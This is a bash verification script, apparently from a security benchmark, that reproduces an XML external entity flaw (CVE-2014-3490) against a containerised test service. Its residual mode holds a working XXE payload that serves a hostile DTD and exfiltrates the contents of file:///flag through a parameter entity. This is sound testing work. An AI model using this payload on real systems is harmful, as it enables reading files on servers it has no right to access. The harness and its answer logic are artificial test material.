#!/usr/bin/env bash
# verify.sh (auto-adapted for PCBV2-0185, executor, flag_channel=X)
# 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
if ! "$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" > "$WORK_DIR/cand.json" 2>/dev/null; then
  "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null
fi
# flag placeholder replace (file-based)
"$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<ADAPTEOF
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
# wrap non-JSON candidate into multi-field dict (file-based)
"$PY" - "$WORK_DIR/cand.json" <<ADAPTEOF2
import json, sys
p = sys.argv[1]
s = open(p, encoding="utf-8", errors="replace").read().strip().strip(chr(34)).strip(chr(39))
try:
    json.loads(s)
except Exception:
    open(p, "w").write(json.dumps({"path": s, "to": s, "payload": s, "css": s}))
ADAPTEOF2
export PCB_X="$RUN_FLAG"
# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
if [[ "$MODE" == "--seed" ]]; then
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual（CVE-2014-3490）：外部 PARAMETER entity XXE。CVE-2012-0818 修复只关
  # external-general-entities，未关 external-parameter-entities -> V1(3.0.8.Final) 仍可
  # 通过参数实体读 /flag。host 侧临时 DTD 服务器（BENIGN，无 secret），payload 引
  # host.docker.internal:<port>/xxe.dtd；%file; 读 file:///flag，&send; 反射进响应。
  OUT="$("$PY" - "$RUN_FLAG" "${PCB_TARGET_PORT:-8080}" <<'PYEOF'
import json, sys, threading, http.server, urllib.request, urllib.error
flag, port = sys.argv[1], sys.argv[2]
DTD = ('<!ENTITY % file SYSTEM "file:///flag">\n'
       '<!ENTITY % wrapper "<!ENTITY send \'%file;\'>">\n'
       '%wrapper;\n')
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type", "text/plain"); self.end_headers()
        self.wfile.write(DTD.encode())
    def log_message(self, *a): pass
srv = http.server.HTTPServer(("0.0.0.0", 0), H)
th = threading.Thread(target=srv.serve_forever, daemon=True); th.start()
dtd_port = srv.server_address[1]
payload = ('<?xml version="1.0"?>'
           '<!DOCTYPE foo [ <!ENTITY %% dtd SYSTEM "http://host.docker.internal:%d/xxe.dtd"> %%dtd; ]>'
           '<foo>&send;</foo>' % dtd_port)
req = urllib.request.Request("http://127.0.0.1:%s/app/xml" % port, data=payload.encode(),
                             headers={"Content-Type": "application/xml"}, method="POST")
try:
    with urllib.request.urlopen(req, timeout=25) as r:
        body = r.read().decode("utf-8", "replace")
except urllib.error.HTTPError as e:
    body = e.read().decode("utf-8", "replace")
except Exception as e:
    body = "<error: %r>" % e
srv.shutdown()
print(json.dumps({"version": "residual", "body": body, "X": flag if flag in body else ""}))
PYEOF
)" || { echo "$OUT" >&2; exit 20; }
fi
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
sys.exit(0 if d.get('X') == '$RUN_FLAG' else 10)" "$OUT"
